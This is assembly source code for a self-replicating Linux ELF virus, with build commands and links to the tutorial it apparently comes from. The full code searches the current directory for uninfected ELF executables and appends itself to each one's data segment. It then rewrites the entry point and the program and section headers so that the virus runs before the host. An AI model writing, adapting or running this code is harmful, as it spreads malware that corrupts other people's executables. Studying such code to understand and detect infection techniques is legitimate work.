;;
;;https://cranklin.wordpress.com/2016/12/26/how-to-create-a-virus-using-the-assembly-language/
;;https://github.com/zengfr/romhack
;;https://gitee.com/zengfr/romhack
;; nasm -f elf -F dwarf -g cranky_data_virus.asm
;; ld -m elf_i386 -e v_start -o cranky_data_virus cranky_data_virus.o

section .text
    global v_start

v_start:
    ; virus body start

    ; make space in the stack for some uninitialized variables to avoid a .bss section
    mov ecx, 2328   ; set counter to 2328 (x4 = 9312 bytes). filename (esp), buffer (esp+32), targets (esp+1056), targetfile (esp+2080)
loop_bss:
    push 0x00       ; reserve 4 bytes (double word) of 0's
    sub ecx, 1      ; decrement our counter by 1
    cmp ecx, 0
    jbe loop_bss
    mov edi, esp    ; esp has our fake .bss offset.  Let's store it in edi for now.

    call folder
    db ".", 0
folder:
    pop ebx         ; name of the folder
    mov esi, 0      ; reset offset for targets
    mov eax, 5      ; sys_open
    mov ecx, 0
    mov edx, 0
    int 80h

    cmp eax, 0      ; check if fd in eax > 0 (ok)
    jbe v_stop        ; cannot open file.  Exit virus

    mov ebx, eax
    mov eax, 0xdc   ; sys_getdents64
    mov ecx, edi    ; fake .bss section
    add ecx, 32     ; offset for buffer
    mov edx, 1024
    int 80h

    mov eax, 6  ; close
    int 80h
    xor ebx, ebx    ; zero out ebx as we will use it as the buffer offset

find_filename_start:
    ; look for the sequence 0008 which occurs before the start of a filename
    inc ebx
    cmp ebx, 1024
    jge infect
    cmp byte [edi+32+ebx], 0x00     ; edi+32 is buffer
    jnz find_filename_start
    inc ebx
    cmp byte [edi+32+ebx], 0x08     ; edi+32 is buffer
    jnz find_filename_start

    xor ecx, ecx    ; clear out ecx which will be our offset for file
    mov byte [edi+ecx], 0x2e   ; prepend file with ./ for full path (.)  edi is filename
    inc ecx
    mov byte [edi+ecx], 0x2f   ; prepend file with ./ for full path (/)  edi is filename
    inc ecx

find_filename_end:
    ; look for the 00 which denotes the end of a filename
    inc ebx
    cmp ebx, 1024
    jge infect

    push esi                ; save our target offset
    mov esi, edi            ; fake .bss
    add esi, 32             ; offset for buffer
    add esi, ebx            ; set source
    push edi                ; save our fake .bss
    add edi, ecx            ; set destination to filename
    movsb                   ; moved byte from buffer to filename
    pop edi                 ; restore our fake .bss
    pop esi                 ; restore our target offset
    inc ecx                 ; increment offset stored in ecx

    cmp byte [edi+32+ebx], 0x00 ; denotes end of the filename
    jnz find_filename_end

    mov byte [edi+ecx], 0x00 ; we have a filename. Add a 0x00 to the end of the file buffer

    push ebx                ; save our offset in buffer
    call scan_file
    pop ebx                 ; restore our offset in buffer

    jmp find_filename_start ; find next file

scan_file:
    ; check the file for infectability
    mov eax, 5      ; sys_open
    mov ebx, edi    ; path (offset to filename)
    mov ecx, 0      ; O_RDONLY
    int 80h

    cmp eax, 0      ; check if fd in eax > 0 (ok)
    jbe return      ; cannot open file.  Return

    mov ebx, eax    ; fd
    mov eax, 3      ; sys_read
    mov ecx, edi    ; address struct
    add ecx, 2080   ; offset to targetfile in fake .bss
    mov edx, 12     ; all we need are 4 bytes to check for the ELF header but 12 bytes to find signature
    int 80h

    call elfheader
    dd 0x464c457f     ; 0x7f454c46 -> .ELF (but reversed for endianness)
elfheader:
    pop ecx
    mov ecx, dword [ecx]
    cmp dword [edi+2080], ecx ; this 4 byte header indicates ELF! (dword).  edi+2080 is offset to targetfile in fake .bss
    jnz close_file  ; not an executable ELF binary.  Return

    ; check if infected
    mov ecx, 0x001edd0e     ; 0x0edd1e00 signature reversed for endianness
    cmp dword [edi+2080+8], ecx   ; signature should show up after the 8th byte.  edi+2080 is offset to targetfile in fake .bss
    jz close_file                   ; signature exists.  Already infected.  Close file.

save_target:
    ; good target!  save filename
    push esi    ; save our targets offset
    push edi    ; save our fake .bss
    mov ecx, edi    ; temporarily place filename offset in ecx
    add edi, 1056   ; offset to targets in fake .bss
    add edi, esi
    mov esi, ecx    ; filename -> edi -> ecx -> esi
    mov ecx, 32
    rep movsb   ; save another target filename in targets
    pop edi     ; restore our fake .bss
    pop esi     ; restore our targets offset
    add esi, 32

close_file:
    mov eax, 6
    int 80h

return:
    ret

infect:
    ; let's infect these targets!
    cmp esi, 0
    jbe v_stop ; there are no targets :( exit

    sub esi, 32

    mov eax, 5              ; sys_open
    mov ebx, edi            ; path
    add ebx, 1056           ; offset to targets in fake .bss
    add ebx, esi            ; offset of next filename
    mov ecx, 2              ; O_RDWR
    int 80h

    mov ebx, eax            ; fd

    mov ecx, edi
    add ecx, 2080           ; offset to targetfile in fake .bss

reading_loop:
    mov eax, 3              ; sys_read
    mov edx, 1              ; read 1 byte at a time (yeah, I know this can be optimized)
    int 80h

    cmp eax, 0              ; if this is 0, we've hit EOF
    je reading_eof
    mov eax, edi
    add eax, 9312           ; 2080 + 7232
    cmp ecx, eax            ; if the file is over 7232 bytes, let's quit
    jge infect
    add ecx, 1
    jmp reading_loop

reading_eof:
    push ecx                ; store address of last byte read. We'll need this later
    mov eax, 6              ; close file
    int 80h

    xor ecx, ecx
    xor eax, eax
    mov cx, word [edi+2080+44]     ; ehdr->phnum (number of program header entries)
    mov eax, dword [edi+2080+28]   ; ehdr->phoff (program header offset)
    sub ax, word [edi+2080+42]     ; subtract 32 (size of program header entry) to initialize loop

program_header_loop:
    ; loop through program headers and find the data segment (PT_LOAD, offset>0)

    ;0	p_type	type of segment
    ;+4	p_offset	offset in file where to start the segment at
    ;+8	p_vaddr	his virtual address in memory
    ;+c	p_addr	physical address (if relevant, else equ to p_vaddr)
    ;+10	p_filesz	size of datas read from offset
    ;+14	p_memsz	size of the segment in memory
    ;+18	p_flags	segment flags (rwx perms)
    ;+1c	p_align	alignement
    add ax, word [edi+2080+42]
    cmp ecx, 0
    jbe infect                  ; couldn't find data segment.  let's close and look for next target
    sub ecx, 1                  ; decrement our counter by 1

    mov ebx, dword [edi+2080+eax]   ; phdr->type (type of segment)
    cmp ebx, 0x01                   ; 0: PT_NULL, 1: PT_LOAD, ...
    jne program_header_loop             ; it's not PT_LOAD.  look for next program header

    mov ebx, dword [edi+2080+eax+4]     ; phdr->offset (offset of program header)
    cmp ebx, 0x00                       ; if it's 0, it's the text segment.  Otherwise, we found the data segment
    je program_header_loop              ; it's the text segment.  We're interested in the data segment

    mov ebx, dword [edi+2080+24]        ; old entry point
    push ebx                            ; save the old entry point
    mov ebx, dword [edi+2080+eax+4]     ; phdr->offset (offset of program header)
    mov edx, dword [edi+2080+eax+16]    ; phdr->filesz (size of segment on disk)
    add ebx, edx                        ; offset of where our virus should reside = phdr[data]->offset + p[data]->filesz
    push ebx                            ; save the offset of our virus
    mov ebx, dword [edi+2080+eax+8]     ; phdr->vaddr (virtual address in memory)
    add ebx, edx        ; new entry point = phdr[data]->vaddr + p[data]->filesz

    mov ecx, 0x001edd0e     ; insert our signature at byte 8 (unused section of the ELF header)
    mov [edi+2080+8], ecx
    mov [edi+2080+24], ebx  ; overwrite the old entry point with the virus (in buffer)
    add edx, v_stop - v_start   ; add size of our virus to phdr->filesz
    add edx, 7                  ; for the jmp to original entry point
    mov [edi+2080+eax+16], edx  ; overwrite the old phdr->filesz with the new one (in buffer)
    mov ebx, dword [edi+2080+eax+20]    ; phdr->memsz (size of segment in memory)
    add ebx, v_stop - v_start   ; add size of our virus to phdr->memsz
    add ebx, 7                  ; for the jmp to original entry point
    mov [edi+2080+eax+20], ebx  ; overwrite the old phdr->memsz with the new one (in buffer)

    xor ecx, ecx
    xor eax, eax
    mov cx, word [edi+2080+48]      ; ehdr->shnum (number of section header entries)
    mov eax, dword [edi+2080+32]    ; ehdr->shoff (section header offset)
    sub ax, word [edi+2080+46]      ; subtract 40 (size of section header entry) to initialize loop

section_header_loop:
    ; loop through section headers and find the .bss section (NOBITS)

    ;0	sh_name	contains a pointer to the name string section giving the
    ;+4	sh_type	give the section type [name of this section
    ;+8	sh_flags	some other flags ...
    ;+c	sh_addr	virtual addr of the section while running
    ;+10	sh_offset	offset of the section in the file
    ;+14	sh_size	zara white phone numba
    ;+18	sh_link	his use depends on the section type
    ;+1c	sh_info	depends on the section type
    ;+20	sh_addralign	alignement
    ;+24	sh_entsize	used when section contains fixed size entrys
    add ax, word [edi+2080+46]
    cmp ecx, 0
    jbe finish_infection        ; couldn't find .bss section.  Nothing to worry about.  Finish the infection
    sub ecx, 1                  ; decrement our counter by 1

    mov ebx, dword [edi+2080+eax+4]     ; shdr->type (type of section)
    cmp ebx, 0x00000008         ; 0x08 is NOBITS which is an indicator of a .bss section
    jne section_header_loop     ; it's not the .bss section

    mov ebx, dword [edi+2080+eax+12]    ; shdr->addr (virtual address in memory)
    add ebx, v_stop - v_start   ; add size of our virus to shdr->addr
    add ebx, 7                  ; for the jmp to original entry point
    mov [edi+2080+eax+12], ebx  ; overwrite the old shdr->addr with the new one (in buffer)

section_header_loop_2:
    mov edx, dword [edi+2080+eax+16]    ; shdr->offset (offset of section)
    add edx, v_stop - v_start   ; add size of our virus to shdr->offset
    add edx, 7                  ; for the jmp to original entry point
    mov [edi+2080+eax+16], edx  ; overwrite the old shdr->offset with the new one (in buffer)

    add eax, 40
    sub ecx, 1
    cmp ecx, 0
    jg section_header_loop_2    ; this loop isn't necessary to make the virus function, but inspecting the host file with a readelf -a shows a clobbered symbol table and section/segment mapping

finish_infection:
    ;dword [edi+2080+24]       ; ehdr->entry (virtual address of entry point)
    ;dword [edi+2080+28]       ; ehdr->phoff (program header offset)
    ;dword [edi+2080+32]       ; ehdr->shoff (section header offset)
    ;word [edi+2080+40]        ; ehdr->ehsize (size of elf header)
    ;word [edi+2080+42]        ; ehdr->phentsize (size of one program header entry)
    ;word [edi+2080+44]        ; ehdr->phnum (number of program header entries)
    ;word [edi+2080+46]        ; ehdr->shentsize (size of one section header entry)
    ;word [edi+2080+48]        ; ehdr->shnum (number of program header entries)
    mov eax, v_stop - v_start       ; size of our virus minus the jump to original entry point
    add eax, 7                      ; for the jmp to original entry point
    mov ebx, dword [edi+2080+32]    ; the original section header offset
    add eax, ebx                    ; add the original section header offset
    mov [edi+2080+32], eax      ; overwrite the old section header offset with the new one (in buffer)

    mov eax, 5              ; sys_open
    mov ebx, edi            ; path
    add ebx, 1056           ; offset to targets in fake .bss
    add ebx, esi            ; offset of next filename
    mov ecx, 2              ; O_RDWR
    int 80h

    mov ebx, eax            ; fd
    mov eax, 4              ; sys_write
    mov ecx, edi
    add ecx, 2080           ; offset to targetfile in fake .bss
    pop edx                 ; host file up to the offset where the virus resides
    int 80h
    mov [edi+7], edx        ; place the offset of the virus in this unused section of the filename buffer

    call delta_offset
delta_offset:
    pop ebp                 ; we need to calculate our delta offset because the absolute address of v_start will differ in different host files.  This will be 0 in our original virus
    sub ebp, delta_offset

    mov eax, 4
    lea ecx, [ebp + v_start]    ; attach the virus portion (calculated with the delta offset)
    mov edx, v_stop - v_start   ; size of virus bytes
    int 80h

    pop edx                 ; original entry point of host (we'll store this double word in the same location we used for the 32 byte filename)
    mov [edi], byte 0xb8        ; op code for MOV EAX (1 byte)
    mov [edi+1], edx            ; original entry point (4 bytes)
    mov [edi+5], word 0xe0ff    ; op code for JMP EAX (2 bytes)

    mov eax, 4
    mov ecx, edi            ; offset to filename in fake .bss
    mov edx, 7              ; 7 bytes for the final jmp to the original entry point
    int 80h

    mov eax, 4              ; sys_write
    mov ecx, edi
    add ecx, 2080           ; offset to targetfile in fake .bss
    mov edx, dword [edi+7]  ; offset of the virus
    add ecx, edx            ; let's continue where we left off

    pop edx                 ; offset of last byte in targetfile in fake.bss
    sub edx, ecx            ; length of bytes to write
    int 80h

    mov eax, 36             ; sys_sync
    int 80h

    mov eax, 6              ; close file
    int 80h

    jmp infect

v_stop:
    ; virus body stop (host program start)
    mov eax, 1      ; sys_exit
    mov ebx, 0      ; normal status
    int 80h